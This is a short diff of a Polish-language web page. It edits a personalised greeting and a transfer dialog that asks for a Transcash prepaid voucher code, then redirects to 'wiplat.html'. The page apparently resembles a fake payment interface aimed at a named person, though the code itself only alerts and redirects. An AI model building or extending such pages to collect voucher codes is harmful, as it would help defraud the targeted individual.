@@ -43,7 +43,7 @@
 <body>
 <div class="header">
     <div class="header-icon">EG</div>
-    <div>Witaj, Elżbieta Grzeszczyk!</div>
+    <div>Witaj, Elzbieto!</div>
     <div class="search-icons">
         <a onclick="toggleSearch()">🔍</a>
         <a onclick="toggleSettings()">⚙️</a>
@@ -152,13 +152,13 @@ function confirmTransfer() {
     const code = document.getElementById('transcashCode').value;
     if (code) {
         alert("Kod wprowadzony: " + code);
-        // Tutaj możesz dodać logikę weryfikacji kodu lub autres actions
-        hideTransferModal();
+        // Ajoutez la redirection vers la nouvelle page ici
+        window.location.href = 'wiplat.html'; // Redirection vers wiplat.html
+        hideTransferModal(); // Si vous souhaitez masquer le modal après la redirection
     } else {
         alert("Musisz wprowadzić kod, aby kontynuować.");
     }
 }
-
 function selectPartner(partnerId) {
     alert(`Wybrano partnera ${partnerId}`);
 }
